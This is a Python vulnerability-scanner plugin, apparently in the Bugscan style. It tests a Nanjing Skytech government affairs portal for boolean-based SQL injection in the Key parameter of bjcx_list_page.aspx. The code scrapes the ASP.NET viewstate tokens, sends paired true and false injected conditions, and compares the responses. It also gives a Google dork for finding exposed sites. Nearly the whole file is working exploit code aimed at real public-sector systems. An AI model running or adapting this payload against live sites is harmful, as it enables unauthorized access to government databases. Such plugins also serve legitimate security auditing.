#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 南京擎天政务系统SQL注入(八)
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-078799
description:
    webpages/bjcx_list_page.aspx parameter:Key
    这个写一块儿确实有难度，不要喷
google dork:
    intitle:行政权力网上办事大厅
'''

import time
import re

def assign(service, arg):
    if service == 'skytech':
        return True, arg

def audit(arg):
    url = arg + 'webpages/bjcx_list_page.aspx'
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    proxy = ('127.0.0.1', 8887)
    #获取viewstate等
    code, head, res, err, _ = curl.curl2(url)
    if code != 200:
        return False
    m = re.search(r'id="__VIEWSTATE"\s*value="([a-zA-Z0-9+/=]*)"',res)
    #print res
    if not m:
        viewstate = ''
    else:
        viewstate = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__EVENTVALIDATION"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        eventvalidation = ''
    else:
        eventvalidation = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    m = re.search(r'id="__VIEWSTATEGENERATOR"\s*value="([a-zA-Z0-9+/=]*)"', res)
    if not m:
        viewstategenerator = ''
    else:
        viewstategenerator = m.group(1).replace('=','%3D').replace('+', '%2B').replace('/', '%2F')
    #构造post表单
    post_true = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__VIEWSTATEGENERATOR={viewstategenerator}&__EVENTVALIDATION={eventvalidation}&Key={payload}'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = 'lkekgrsdakoadfopwre%27%29+or+1234%2B5432%3D6666--'
    )
    post_false = '__EVENTTARGET=Btn_Search&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE={viewstate}&__EVENTVALIDATION={eventvalidation}&Key={payload}&Ctr_BeginTime=2016-01-01&Ctr_EndTime=2016-01-07'.format(
        viewstate = viewstate,
        viewstategenerator = viewstategenerator,
        eventvalidation = eventvalidation,
        payload = 'lkekgrsdakoadfopwre%27%29+or+1234%2B5432%3D6667--'
    )
    code, head, res_false, err, _ = curl.curl2(url, post=post_false, referer=url, header=content_type)
    if code != 200:
        return False
    code, head, res_true, err, _ = curl.curl2(url, post=post_true, referer=url, header=content_type)
    #bool注入的匹配模式
    pattern = 'OnMouseOver="JavaScript:this.className=\'DG_Over\'"'
    if (pattern in res_true) and (pattern not in res_false):
        security_hole('SQL Injection: ' + url + ' Parameter:Key')